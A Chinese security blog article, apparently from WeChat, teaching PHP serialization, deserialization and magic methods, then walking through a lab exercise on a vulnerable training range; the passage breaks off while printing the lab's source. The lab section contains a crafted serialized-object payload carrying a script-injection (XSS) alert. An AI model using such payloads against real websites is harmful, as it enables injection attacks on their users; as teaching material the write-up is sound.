<html>
<head>
<title>Web安全PHP反序列化入门这一篇就够了</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
Web安全 | PHP反序列化入门这一篇就够了
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Buffer
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-06-16</em>
                </div>

                
                                                                                                                                                                                                                        <div id="js_tags"  class="article-tag__list" data-len="3">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1916264558466269191#wechat_redirect" data-tag_id="" data-album_id="1916264558466269191"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>Web安全</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>2</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1916264558365605895#wechat_redirect" data-tag_id="" data-album_id="1916264558365605895"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>代码审计</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>2</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1916264558214610946#wechat_redirect" data-tag_id="" data-album_id="1916264558214610946"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>PHP反序列化</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>1</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><p data-mpa-powered-by="yiban.io"><span style="font-size:15px;line-height:35px;;"><strong>序列化</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">搞懂反序列化漏洞的前提,先搞懂什么是序列化:</span></p><p><span style="font-size:15px;line-height:35px;;">序列化说通俗点就是把一个对象变成可以传输的字符串。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">序列化实际是为了传输的方便,以整个对象为单位进行传输, 而序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。如果了解底层的同学可以知道,类中的方法本就不在类中。</span></p><p><span style="font-size:15px;line-height:35px;;">而在php中,使用函数serialize()来返回一个包含字节流的字符串来表示</span></p><p><span style="font-size:15px;line-height:35px;;">比如:</span></p><p><span style="font-size:15px;line-height:35px;;">class S{</span></p><p><span style="font-size:15px;line-height:35px;;">public $test="sd";</span></p><p><span style="font-size:15px;line-height:35px;;">}</span></p><p><span style="font-size:15px;line-height:35px;;">$s=new S(); //创建一个对象</span></p><p><span style="font-size:15px;line-height:35px;;">serialize($s); //把这个对象进行序列化</span></p><p><span style="font-size:15px;line-height:35px;;">序列化的结果是:</span></p><p><span style="font-size:15px;line-height:35px;;">O:1:"S":1:{s:4:"test";s:2:"sd";}</span></p><p><span style="font-size:15px;line-height:35px;;">代表的含义依次是:</span></p><ul class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">O:代表object</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">1:代表对象名字长度为一个字符</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">S:对象的名称</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">1:代表对象里面有一个变量</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">s:数据类型(string)</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">4:变量名称的长度</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">test:变量名称</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">s:数据类型</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">2:变量值的长度</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">sd:变量值</span></p></li></ul><p><span style="font-size:15px;line-height:35px;;">顺便说一下PHP 对不同类型的数据用不同的字母进行标示</span></p><ul class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">a - array</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">b - boolean</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">d - double</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">i - integer</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">o - common object</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">r - reference</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">s - string</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">C - custom object</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">O - class</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">N - null</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">R - pointer reference</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">U - unicode string</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p></li></ul><p><span style="font-size:15px;line-height:35px;;"><strong>反序列化</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</span></p><p><span style="font-size:15px;line-height:35px;;">使用unserialize()函数</span></p><p><span style="font-size:15px;line-height:35px;;">$u=unserialize("O:1:"S":1:{s:4:"test";s:2:"sd";}");</span></p><p><span style="font-size:15px;line-height:35px;;">echo $u-&gt;test; //得到的结果为sd</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>反序列化安全</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>序列化和反序列化本身没有问题</strong>,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</span></p><p><span style="font-size:15px;line-height:35px;;">有哪些php常见的魔法函数:</span></p><ul class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__construct()&nbsp;当一个对象创建时被调用</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__destruct()&nbsp;当一个对象销毁前被调用</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__sleep()&nbsp;在对象被序列化前被调用</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__wakeup&nbsp;将在反序列化之后立即被调用</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__toString&nbsp;当一个对象被当做字符串使用时被调用</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__get(),__set()&nbsp;当调用或设置一个类及其父类方法中未定义的属性时</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__invoke()&nbsp;调用函数的方式调用一个对象时的回应方法</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">__call 和&nbsp;__callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。</span></p></li></ul><p><span style="font-size:15px;line-height:35px;;">有面向对象编程基础的同学应该很多都能看懂,比如__contruct()：c++中的构造函数,java中的构造器；__destruct()：c++中的析构函数.java的自动回收机制:finalize()</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>靶场实战</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">了解了序列化、反序列化、php魔法函数,先来看一个靶场,尝试反序列化构造payload</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>payload</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">看一下题目,已知反序列化入口</span></p><p><img data-ratio="0.6359375" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/1_IT4bWA06w2m34icZiaGel0Jj3IWEfw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRazhwpHne4QL6bdOGlGssDDksorfIT4bWA06w2m34icZiaGel0Jj3IWEfw/640?wx_fmt=png'" data-type="png" data-w="1280"  /></p><p><span style="font-size:15px;line-height:35px;;">先随便输点东西看看</span></p><p><img data-ratio="0.3559322033898305" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/2_YDQh9ABb5icibEmeqTBaI5PVNm6g3A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaM9icHCeM2Cqx4bcXVtwXdj0cic0UYDQh9ABb5icibEmeqTBaI5PVNm6g3A/640?wx_fmt=png'" data-type="png" data-w="944"  /></p><p><span style="font-size:15px;line-height:35px;;">这里既然是反序列化接口,就需要输入我们序列化的字符串,比如插入我们刚刚的payload</span></p><p><span style="font-size:15px;line-height:35px;;">O:1:"S":1:{s:4:"test";s:2:"sd";}</span></p><p><img data-ratio="0.30156657963446476" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/3_Zr9tl1cph9Riaa2MyyAY7p2ib79hRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRa80mnlx5ggYtrX37Rnm2EpPK27RZr9tl1cph9Riaa2MyyAY7p2ib79hRA/640?wx_fmt=png'" data-type="png" data-w="766"  /></p><p><span style="font-size:15px;line-height:35px;;">不仅于此,构造xss</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">O</span><span class="code-snippet__selector-pseudo">:1</span><span class="code-snippet__selector-pseudo">:"S"</span><span class="code-snippet__selector-pseudo">:1</span>:{<span class="code-snippet__attribute">s</span>:<span class="code-snippet__number">4</span>:<span class="code-snippet__string">"test"</span>;<span class="code-snippet__attribute">s</span>:<span class="code-snippet__number">28</span>:<span class="code-snippet__string">"&lt;script&gt;alert('sd')&lt;/script&gt;"</span>;}</span></code></pre></section><p><img data-ratio="0.25157728706624605" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/4_FPr0m3Ivuu0riarniaS0aHNupIdqHA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaHWfMoiaBehyJITHiaNAyMiaZjRld9FPr0m3Ivuu0riarniaS0aHNupIdqHA/640?wx_fmt=png'" data-type="png" data-w="1268"  /></p><p><span style="font-size:15px;line-height:35px;;"><strong>漏洞原理分析</strong></span></p><p><span style="font-size:15px;line-height:35px;;">先看源码</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">$SELF_PAGE = substr($_SERVER[<span class="code-snippet__string">'PHP_SELF'</span>],strrpos($_SERVER[<span class="code-snippet__string">'PHP_SELF'</span>],<span class="code-snippet__string">'/'</span>)+<span class="code-snippet__number">1</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> ($SELF_PAGE = <span class="code-snippet__string">"unser.php"</span>){</span></code><code><span class="code-snippet_outer">$ACTIVE = <span class="code-snippet__keyword">array</span>(<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">'active open'</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">'active'</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>,<span class="code-snippet__string">''</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">$PIKA_ROOT_DIR =  <span class="code-snippet__string">"../../"</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">include_once</span> $PIKA_ROOT_DIR.<span class="code-snippet__string">'header.php'</span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> <span class="code-snippet__title">S</span></span>{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">var</span> $test = <span class="code-snippet__string">"pikachu"</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">__construct</span><span class="code-snippet__params">()</span></span>{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">echo</span> <span class="code-snippet__keyword">$this</span>-&gt;test;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">$html=<span class="code-snippet__string">''</span>;</span></code><code><span 